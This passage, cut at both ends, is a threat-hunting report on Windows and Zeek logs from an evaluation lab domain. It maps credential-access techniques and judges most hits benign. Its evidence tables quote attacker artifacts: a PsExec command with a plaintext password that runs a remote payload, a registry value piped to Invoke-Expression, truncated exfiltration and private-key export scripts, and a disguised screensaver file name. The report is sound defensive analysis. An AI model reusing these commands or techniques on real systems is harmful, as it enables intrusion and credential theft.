The stuffing checks (C125/C126/C127/C130) returned zero hits — there are no 4625 failures at all in windows.security, so no large set of stolen username/password pairs was replayed. The only credential-related messages in windows.other are benign: 'Credential Guard configuration: 0x0, 0' on scranton and the SAM remote-call restriction notice (event 16962). The successful logons observed (pbeesly logon type 10 from 172.18.39.2 on scranton at 23:20:46, and 4776 success on newyork) are single, consistent uses of one account, not stuffing.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:19:09.000Z | scranton.dmevals.local | windows.other | message | Credential Guard configuration: 0x0, 0 | .ds-logs-windows.other-default-2026.10.22-000001 / AaFiKJc9VXKkeBwdMB1A | q-aae8b8ef98 | ok |
| 2 | 2020-05-02 03:20:48.000Z | scranton.dmevals.local | windows.other | message | Remote Desktop Services: Session logon succeeded:    User: DMEVALS\pbeesly  Session ID: 2  Source Network Address: 172.18.39.2 | .ds-logs-windows.other-default-2026.10.22-000001 / AaFiKJc9VXKkeBwdLx3n | q-aae8b8ef98 | ok |

### F18 · benign / medium · T1111 · No MFA/smart-card interception artifacts; credential-related hits are Windows defaults and a broader credential-access intrusion

Evidence status: **verified**

Hunting for T1111 (MFA Interception) produced no evidence of MFA token, smart-card, or credential-provider interception. The 4648 explicit-credential logons (15 total) are dominated by the pbeesly account (9) used through C:\Windows\PSEXESVC.exe on nashua.dmevals.local and svchost.exe on scranton.dmevals.local, plus routine DWM-/UMFD-/machine-account logons from winlogon.exe/wininit.exe. The only 4624 logons of type 10 (RemoteInteractive) are pbeesly from 172.18.39.2 with Negotiate on scranton. Registry 'Credential' hits are Windows-default CredentialGuard/CredentialEnrollmentManagerUserSvc writes by lsass.exe/services.exe on scranton and nashua, and windows.other shows only 'Credential Guard configuration: 0x0, 0'. No PowerShell script block referencing Credential/MFA/smartcard was found (C135 zero hits). The LSASS accesses observed (svchost.exe 289, AntimalwareConfig.exe 15, WindowsAzureTelemetryService.exe 13, plus powershell.exe 0x1000, wsmprovhost.exe 0x1f3fff, wininit/csrss/services) are consistent with normal system/AV/telemetry behaviour and with generic credential dumping rather than MFA interception. Note however that the same pbeesly session on scranton.dmevals.local is clearly malicious in other respects (execution of C:\ProgramData\victim\...cod.3aka3.scr, hidden PowerShell with IEX from a bitmap, csc.exe compilation, sdelete64.exe wiping, accesschk.exe, and an Invoke-Exfil script), so the host is compromised even though T1111 itself is not observed.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | process.executable | C:\Windows\PSEXESVC.exe | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuu5GRH | q-1622a155d4 | ok |
| 2 | 2020-05-02 03:20:46.000Z | scranton.dmevals.local | windows.security | win.TargetUserName | pbeesly | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBudppFX | q-f808601f79 | ok |
| 3 | 2020-05-02 03:20:46.000Z | scranton.dmevals.local | windows.security | win.LogonType | 10 | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBudppFY | q-64d2e28fa8 | ok |
| 4 | 2020-05-02 03:19:09.865Z | scranton.dmevals.local | windows.sysmon | win.TargetObject | HKLM\System\CurrentControlSet\Control\DeviceGuard\Scenarios\CredentialGuard\Enabled | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBnfdUsq | q-da6324f6e5 | ok |
| 5 | 2020-05-02 03:20:48.264Z | scranton.dmevals.local | windows.sysmon | win.Details | C:\windows\system32\CredentialEnrollmentManager.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBnQM1oU | q-da6324f6e5 | ok |
| 6 | 2020-05-02 03:19:09.000Z | scranton.dmevals.local | windows.other | message | Credential Guard configuration: 0x0, 0 | .ds-logs-windows.other-default-2026.10.22-000001 / AaFiKJc9VXKkeBwdMB1A | q-e26232d97d | ok |
| 7 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1f3fff | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBn663fz | q-519341a39b | ok |
| 8 | 2020-05-02 03:01:03.622Z | scranton.dmevals.local | windows.sysmon | win.GrantedAccess | 0x1000 | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoXbqWA | q-e4e70d3499 | ok |
| 9 | 2020-05-02 02:55:56.157Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\ProgramData\victim\â€®cod.3aka3.scr" /S | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBow1KRR | q-5d26868dca | ok |
| 10 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByPYrDh | q-40a0202a63 | ok |

### F20 · benign / high · T1187 · Benign domain baseline: SYSVOL/IPC$ share access and SMB connections by machine accounts

Evidence status: **verified**

The 5140/5145 share-access events (163 total) and the Sysmon event.code 3 SMB connections to 445/139 are routine domain behaviour: machine accounts NEWYORK$, SCRANTON$, NASHUA$, UTICA$ and WEC$ read \\*\SYSVOL policy files (gpt.ini, GptTmpl.inf) from newyork.dmevals.local, and pbeesly performed an IPC$ samr lookup from 10.0.1.4. The 445 connections are System (PID 4) kernel SMB, mostly loopback/IPv6 on newyork and normal workstation-to-DC traffic to 10.0.0.4. The only non-baseline SMB item is scranton (10.0.1.4) writing Temp\python.exe to nashua's ADMIN$ at 03:10:23, which is lateral movement rather than forced authentication. No .lnk/.scf/.url coercion files were found in the Sysmon file-creation stack, and no PowerShell script block referenced 445/WebDAV/NTLM in the C141 check.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:01:43.000Z | newyork.dmevals.local | windows.security | win.ShareName | \\*\SYSVOL | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBy8KXgx | q-c03255f287 | ok |
| 2 | 2020-05-02 03:01:43.000Z | newyork.dmevals.local | windows.security | user.name | SCRANTON$ | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBy8KXgx | q-c03255f287 | ok |
| 3 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | win.RelativeTargetName | samr | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBy8J3fR | q-c03255f287 | ok |
| 4 | 2020-05-02 02:56:48.006Z | newyork.dmevals.local | windows.sysmon | process.executable | System | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBouzOll | q-1537ab6b8f | ok |
| 5 | 2020-05-02 02:56:48.006Z | newyork.dmevals.local | windows.sysmon | destination.port | 445 | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBouzOll | q-1537ab6b8f | ok |

### F22 · benign / medium · T1212 · Kerberos 4768/4769 ticket activity and Zeek notices/weirds show no exploitation-driven credential access

Evidence status: **verified**

The Kerberos hits (28x 4769, 14x 4768) are ordinary domain service-ticket requests on newyork.dmevals.local: user pbeesly@DMEVALS.LOCAL requesting tickets for machine accounts NEWYORK$, NASHUA$ and krbtgt from client addresses 10.0.1.4/10.0.1.6, plus SCRANTON$ requesting NEWYORK$ — normal workstation/DC authentication with no 4770 and no anomalous encryption or volume spike visible. The Zeek notices/weirds (14 records, 2020-04-30, observers bobs.bigwheel.local and simplerockbuild.simplerock.lan) are generic 'Zeek weird log'/'Zeek notice log' entries with no exploit or credential payload, and that window does not overlap the Windows telemetry. The remaining LSASS process-access hits are routine: svchost.exe with 0x1000 (216 on scranton, 30 newyork, 28 nashua, 12 utica), wininit.exe/csrss.exe at system start, and wsmprovhost.exe 0x1f3fff on nashua whose call trace runs through System.ni.dll (managed .NET WinRM host, not a dump).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | message | A Kerberos service ticket was requested.    Account Information:  	Account Name:		pbeesly@DMEVALS.LOCAL  	Account Domain:		DMEVALS.LOCAL  	Logon GUID:		{b4946ef… | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBy4FbJD | q-3c66052797 | ok |
| 2 | 2020-05-02 03:04:04.000Z | newyork.dmevals.local | windows.security | user.name | pbeesly@DMEVALS.LOCAL | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBy4FbJD | q-3c66052797 | ok |
| 3 | 2020-05-02 03:09:29.430Z | nashua.dmevals.local | windows.sysmon | win.CallTrace | C:\windows\SYSTEM32\ntdll.dll+9c584\|C:\windows\System32\KERNELBASE.dll+2732e\|C:\windows\assembly\NativeImages_v4.0.30319_64\System\9803982d7bc887e2745bff18a43… | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBn663fz | q-e9877888c1 | ok |
| 4 | 2020-04-30 00:15:18.392Z | simplerockbuild.simplerock.lan | zeek | message | Zeek notice log from simplerockbuild.simplerock.lan | .ds-logs-zeek-default-2026.10.22-000001 / AaFiKZc9VXKkeBwkgR8i | q-febe6d3e74 | ok |

### F23 · benign / high · T1539 · No web session cookie theft observed; cookie-related hits are benign Windows WebDAV/IE cookie handling

Evidence status: **verified**

Hunting for T1539 on the 2020-05-02 Windows telemetry found no evidence of browser session-cookie theft. The only 'cookie' process creations are five rundll32.exe DavSetCookie invocations on scranton.dmevals.local (2020-05-01T23:08:50-23:10:23 local / 03:08-03:10Z) spawned by svchost.exe under user pbeesly, which is the standard WebDAV redirector registering a cookie for the http://192.168.0.4/webdav share — the same WebDAV endpoint the malicious Invoke-Exfil script later uses, so this is normal WebDAV client behaviour, not cookie theft. The single Sysmon file-creation matching 'cookie' is svchost.exe creating C:\Windows\ServiceProfiles\LocalService\...\AC\INetCookies on scranton at 03:21:05Z, a Windows Internet Explorer/WinINet cache artifact. No browser cookie databases (Cookies, Login Data, Web Data, Local State) were created or modified anywhere in the window, and no PowerShell script block referenced cookies. Sysmon process-access (event 10) to Edge/EdgeCP/EdgeSH processes came only from legitimate system components (Explorer.EXE, svchost.exe, csrss.exe, lsass.exe, RuntimeBroker.exe, sihost.exe, browser_broker.exe) with no credential-stealer process touching browser memory. Note: separate, clearly malicious activity IS present on scranton.dmevals.local (Invoke-Exfil/Invoke-BeachCleanup/Invoke-SeaDukeStage PowerShell, 7-Zip password-protected archive of the user's Downloads folder exfiltrated to \\192.168.0.4\webdav, hidden base64 PowerShell), but that collection targets the Downloads directory and WebDAV staging, not browser cookie stores, so it does not constitute T1539.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:08:50.000Z | scranton.dmevals.local | windows.security | process.command_line | rundll32.exe C:\windows\system32\davclnt.dll,DavSetCookie 192.168.0.4 http://192.168.0.4/webdav | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBur1GH0 | q-37cf61026b | ok |
| 2 | 2020-05-02 03:08:50.000Z | scranton.dmevals.local | windows.security | process.parent.executable | C:\Windows\System32\svchost.exe | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBur1GH0 | q-52e398c254 | ok |
| 3 | 2020-05-02 03:21:05.681Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Windows\ServiceProfiles\LocalService\AppData\Local\Packages\warp_jit_db4a1097-b484-4973-bbf2-a04208ecd4d4\AC\INetCookies | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBi-6ySm | q-6019192211 | ok |
| 4 | 2020-05-02 03:21:05.681Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\System32\svchost.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBi-6ySm | q-742522c034 | ok |
| 5 | 2020-05-02 03:08:02.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Invoke-Exfil {      if (!(Get-Module -Name "7Zip4Powershell")) { Write-Host "[*] Installing 7Zip4Powershell module"; Install-Module -Name 7Zip4Powershe… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByPYrDh | q-ef699966e7 | ok |

### F26 · benign / high · T1552.002 · Registry Password/Credential value sets are Windows service and identity-provider noise

Evidence status: **verified**

The 17 Sysmon 13 hits on Password/Credential registry paths are all written by legitimate system binaries: svchost.exe setting HKU\.DEFAULT\Software\Microsoft\IdentityCRL\ProviderPasswordLength/CharacterGroups on nashua and scranton, lsass.exe setting DeviceGuard\Scenarios\CredentialGuard\Enabled, services.exe registering the CredentialEnrollmentManagerUserSvc service, and winlogon.exe writing PasswordExpiryNotification\NotShownTime. No attacker process wrote credential-bearing registry values.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:05:28.255Z | nashua.dmevals.local | windows.sysmon | win.TargetObject | HKU\.DEFAULT\Software\Microsoft\IdentityCRL\ProviderPasswordLength | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoKOGL_ | q-8c80d4ab4c | ok |
| 2 | 2020-05-02 03:19:09.865Z | scranton.dmevals.local | windows.sysmon | win.TargetObject | HKLM\System\CurrentControlSet\Control\DeviceGuard\Scenarios\CredentialGuard\Enabled | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBnfdUsq | q-8c80d4ab4c | ok |
| 3 | 2020-05-02 03:21:20.841Z | scranton.dmevals.local | windows.sysmon | win.TargetObject | HKU\S-1-5-21-1830255721-3727074217-2423397540-1107\Software\Microsoft\Windows\Winlogon\PasswordExpiryNotification\NotShownTime | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBi85CSh | q-8c80d4ab4c | ok |

### F27 · benign / medium · T1552.003 · No access to PowerShell console history files observed

Evidence status: **verified**

ES\|QL searches over Sysmon process creation and Security 4663/4656/4658 object access for ConsoleHost_history returned no hits, and a targeted search of Security file-access events for passw/cred/unattend/sysvol/groups.xml/.key/.pfx/consolehost_history object names also returned zero rows. Shell-history harvesting is not evidenced in this window.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:11:40.000Z | nashua.dmevals.local | windows.security | event.code | 4648 | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuu5GRH | q-f80385ae36 | ok |

### F28 · benign / medium · T1552.004 · RSA key-container files created under Crypto\RSA are normal CNG key generation, not private-key theft

Evidence status: **verified**

Sysmon 11 shows key-container files created under C:\Users\pbeesly\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-...-1107 by PowerShell on scranton, under C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18 by PSEXESVC.exe on nashua and by rundll32.exe on scranton. These are machine/user key containers generated by the crypto API when the processes ran; no .pem/.pfx/.key file reads or copies were found (the dedicated .pem/.pfx/.key searches returned zero hits).

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:58:46.136Z | scranton.dmevals.local | windows.sysmon | win.TargetFilename | C:\Users\pbeesly\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-1830255721-3727074217-2423397540-1107\759b3ce8d23a2a295661b6fb52b574e1_47ab858c-e134-41af-97b1-46… | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoqv86o | q-3a2b277358 | ok |
| 2 | 2020-05-02 03:11:40.081Z | nashua.dmevals.local | windows.sysmon | win.TargetFilename | C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18 | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoz4j7n | q-3a2b277358 | ok |

### F31 · benign / high · T1555.003 · No browser credential-store access observed

Evidence status: **verified**

No evidence of web-browser credential theft. Searches for Login Data / logins.json / key3.db / key4.db / Cookies file creation in sysmon (event 11) returned only two unrelated files: C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx written by powershell.exe (a certificate export, not a browser store) and an INetCookies file under the LocalService ServiceProfiles warp package written by svchost.exe. The pre-supplied checks for browser-store command lines, file writes, browser process handles, object access and PowerShell script text all returned zero hits. The attacker's collection on scranton instead targeted documents/archives (Compress-Archive over *.doc,*.xls,*.pdf,*pass*,*login* etc.) and certificates, not browser databases.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQkXH | q-61727c000e | ok |
| 2 | 2020-05-02 03:21:05.681Z | scranton.dmevals.local | windows.sysmon | file.path | C:\Windows\ServiceProfiles\LocalService\AppData\Local\Packages\warp_jit_db4a1097-b484-4973-bbf2-a04208ecd4d4\AC\INetCookies | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBi-6ySm | q-e6adb155a4 | ok |
| 3 | 2020-05-02 02:56:17.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByXfnRy | q-420450a1e6 | ok |

### F32 · benign / medium · T1555.004 · No Windows Credential Manager / vault / DPAPI access; LSASS handles from Azure guest agents are baseline

Evidence status: **verified**

No Credential Manager harvesting was observed. There were no cmdkey/vaultcmd/rundll32 keymgr invocations (4688 command-line checks returned zero), no registry writes to Credentials keys (sysmon event 15 check returned zero), and no PowerShell script blocks referencing Credential/vault/cmdkey. The only 'credential' text in windows.other is a boot-time 'Credential Guard configuration: 0x0, 0' event on scranton. Object-access auditing on lsass.exe objects shows only baseline actors: C:\WindowsAzure\Packages\CollectGuestLogs.exe (0x1410/0x10) on nashua, utica, scranton and newyork, C:\Program Files\Windows Defender\MsMpEng.exe (0x1fffff) on scranton, and lsass.exe itself (0x1478). The pbeesly-attributed 0x1f3fff/0x1fffff handles from powershell.exe (scranton, 03:05:16) and wsmprovhost.exe (nashua, 03:09:29) are covered under T1555; the nashua one is explained by Get-Process -IncludeUserName. No vault/DPAPI secret extraction was found.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:20:15.000Z | scranton.dmevals.local | windows.security | win.ProcessName | C:\Program Files\Windows Defender\MsMpEng.exe | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBudppHD | q-7ff9ae24c2 | ok |
| 2 | 2020-05-02 03:22:38.000Z | nashua.dmevals.local | windows.security | win.ProcessName | C:\WindowsAzure\Packages\CollectGuestLogs.exe | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBuitni7 | q-7ff9ae24c2 | ok |
| 3 | 2020-05-02 03:19:09.000Z | scranton.dmevals.local | windows.other | message | Credential Guard configuration: 0x0, 0 | .ds-logs-windows.other-default-2026.10.22-000001 / AaFiKJc9VXKkeBwdMB1A | q-d820219026 | ok |

### F33 · benign / high · T1555.005 · No password-manager artifacts (KeePass/1Password/Bitwarden/LastPass) observed

Evidence status: **verified**

All password-manager checks returned zero hits across sysmon process creation, file creation, process handles, security 4688 command lines, PowerShell 4104 script text and windows.other messages. No .kdbx files, no password-manager executables and no password-manager process access appear in the 02:55-03:28Z window on any of the four hosts. The only credential-like material the intruder handled was a certificate exported to C:\Users\pbeesly\Downloads\coyn5igj.3io.pfx by powershell.exe on scranton at 03:04:57Z, which is not a password-manager store.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:04:57.460Z | scranton.dmevals.local | windows.sysmon | process.executable | C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoMQkXH | q-61727c000e | ok |
| 2 | 2020-05-02 03:04:56.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | function Get-PrivateKeys {     $mypwd = ConvertTo-SecureString -String "saribas" -Force -AsPlainText     $CertPaths = Get-ChildItem -Path cert:\LocalMachine -Re… | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByRaLqc | q-45710f6d81 | ok |

### F36 · benign / medium · T1556.002 · No password filter DLL installation observed

Evidence status: **verified**

No writes of DLLs into System32, no 4657 registry changes under Notification Packages/Password/lsass keys, and no 4688/4104 references to Notification Packages or PasswordFilter were found. The only DLL loads near authentication components were ordinary Microsoft modules (cryptdll.dll, samlib.dll, samcli.dll) loaded by SearchProtocolHost/SearchFilterHost/WmiPrvSE/powershell, which is normal Windows behaviour.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 02:57:01.962Z | scranton.dmevals.local | windows.sysmon | win.ImageLoaded | C:\Windows\System32\cryptdll.dll | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoty_Kk | q-ce242378db | ok |
| 2 | 2020-05-02 03:04:04.501Z | scranton.dmevals.local | windows.sysmon | win.ImageLoaded | C:\Windows\System32\samcli.dll | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoOSnoR | q-ce242378db | ok |

### F37 · benign / medium · T1556.005 · No reversible-encryption / AD account flag changes observed

Evidence status: **verified**

No 4739 policy-change events, no Set-ADUser/dsmod/Reversible command lines in 4688 or Sysmon process creation, and no PowerShell script blocks referencing AllowReversiblePasswordEncryption. The only account-related PowerShell activity was the malicious loader chain on scranton, which does not touch reversible encryption.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:21:28.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockText | Get-ItemPropertyValue 'HKLM:\\SOFTWARE\Javasoft' 'value Supplement' \| Invoke-Expression | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByKWUg0 | q-8a6dbda72f | ok |

### F38 · benign / medium · T1556.006 · No MFA modification observed

Evidence status: **verified**

No 4739/5136/4738 events and no Set-ADUser/Set-ADAuthenticationPolicy style command lines were found in security, sysmon or other logs; nothing indicates MFA registration or policy tampering.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:25:30.859Z | nashua.dmevals.local | windows.sysmon | process.command_line | C:\windows\System32\dsregcmd.exe $(Arg0) $(Arg1) $(Arg2) | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBi30BSA | q-f15523822c | ok |

### F39 · benign / medium · T1556.007 · dsregcmd executions are routine device-registration checks, not hybrid-identity tampering

Evidence status: **verified**

dsregcmd.exe ran as SYSTEM with the unexpanded template command line 'C:\windows\System32\dsregcmd.exe $(Arg0) $(Arg1) $(Arg2)' on scranton (03:19:12, 03:21:48, 03:24:13), newyork (03:06:14) and nashua (03:25:30), parent svchost.exe, and only loaded cryptdll.dll. No 5136 directory changes and no Connect-MsolService/Connect-AzureAD script blocks were found, so there is no evidence of federated-identity or token-signing modification.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:25:30.859Z | nashua.dmevals.local | windows.sysmon | process.executable | C:\Windows\System32\dsregcmd.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBi30BSA | q-f15523822c | ok |
| 2 | 2020-05-02 03:06:14.652Z | newyork.dmevals.local | windows.sysmon | host.name | newyork.dmevals.local | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoGKqgM | q-f15523822c | ok |

### F40 · benign / medium · T1556.008 · No network provider DLL registration observed

Evidence status: **verified**

No 4657 registry changes under NetworkProvider/Credential keys and no PowerShell script blocks referencing NetworkProvider or New-ItemProperty were found; the malicious PowerShell on scranton used reflective loading, not a network provider DLL registration.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:21:29.000Z | scranton.dmevals.local | windows.powershell | win.ScriptBlockId | bc19aae2-d1f9-49b2-b718-192531ae928f | .ds-logs-windows.powershell-default-2026.10.22-000001 / AaFiKJc9VXKkeByKWlPk | q-8a6dbda72f | ok |

### F41 · benign / medium · T1557 · No adversary-in-the-middle positioning observed; credential theft in this window used direct PsExec with plaintext credentials

Evidence status: **verified**

Across windows.security, windows.sysmon, windows.other and windows.powershell (2020-05-02 02:55-03:28Z) there is no evidence of traffic interception. All network logons are Kerberos (123 NEWYORK$, 37 SCRANTON$, 25 NASHUA$, 19 pbeesly, 8 WEC$, 5 UTICA$) with a single NTLM logon (pbeesly, logon type 3, from 172.18.39.2 to scranton at 03:20:41). Sysmon event 3 destinations are the normal DC/file-server ports (445, 389, 88, 53, 135) and all DestinationHostname values are '-'. The actual intrusion in this window is direct: pbeesly on scranton.dmevals.local ran PsExec64.exe against \\NASHUA with the password supplied on the command line, and installed a javamtsup service on scranton. That is credential use, not credential interception, so T1557 itself is not supported.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-05-02 03:20:41.000Z | scranton.dmevals.local | windows.security | win.AuthenticationPackageName | NTLM | .ds-logs-windows.security-default-2026.10.22-000001 / AaFiJ5c9VXKkeBufr2mI | q-210fb6a04a | ok |
| 2 | 2020-05-02 03:14:42.601Z | scranton.dmevals.local | windows.sysmon | process.command_line | "C:\Program Files\SysinternalsSuite\PsExec64.exe" -accepteula \\NASHUA -u dmevals\pbeesly -p Fl0nk3rt0n!T0by -i 2 C:\Windows\Temp\python.exe | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJ5c9VXKkeBoz3z5O | q-b5c170fe89 | ok |

### F42 · benign / medium · T1557.001 · SMB traffic and name resolution are normal; no LLMNR/NBT-NS poisoning or SMB relay artifacts

Evidence status: **verified**

Zeek (2020-04-30 00:06-00:45Z) shows only ordinary SMB to the domain controller NEWYORK.dmevals.local (10.0.0.4): IPC$ pipe mappings, SYSVOL GPO reads (gpt.ini, GptTmpl.inf) and krb,smb,gssapi sessions from 10.0.1.4 and 10.0.1.6. No SMB session is directed at an unauthorized host and no relay-style authentication to a non-DC endpoint appears. DNS queries are routine (wpad.dmevals.local, wec.dmevals.local, _ldap._tcp SRV lookups, Microsoft telemetry); the only name-resolution oddities are single 'wpad' and 'prisoner.iana.org' lookups, which are standard Windows/connectivity-test behaviour. Sysmon 22 query names on the Windows hosts are likewise normal (host names, _ldap._tcp SRV records, Microsoft domains). No PowerShell script block references LLMNR, NBT-NS, Responder or relay tooling, and no 4657 DNS client registry tampering was found.

| # | Time (UTC) | Host | Dataset | Field | Stored value | Event (_index / _id) | Query | Check |
|---|---|---|---|---|---|---|---|---|
| 1 | 2020-04-30 00:12:01.658Z | simplerockbuild.simplerock.lan | zeek | zeek.path | \\NEWYORK.dmevals.local\sysvol | .ds-logs-zeek-default-2026.10.22-000001 / AaFiKZc9VXKkeBwkgh9E | q-f697cc3590 | ok |
| 2 | 2020-04-30 00:21:38.941Z | simplerockbuild.simplerock.lan | zeek | zeek.path | \\NEWYORK.dmevals.local\IPC$ | .ds-logs-zeek-default-2026.10.22-000001 / AaFiKZc9VXKkeBwkgh8L | q-f697cc3590 | ok |
| 3 | 2020-05-02 03:22:32.759Z | utica.dmevals.local | windows.sysmon | destination.port | 445 | .ds-logs-windows.sysmon-default-2026.10.22-000001 / AaFiJpc9VXKkeBi63kXG | q-180859f170 | ok |

### F43 · benign / medium · T1557.002 · No ARP cache poisoning: MAC-to-IP mappings are stable and the responder MAC is a lab placeholder

Evidence status: **verified**

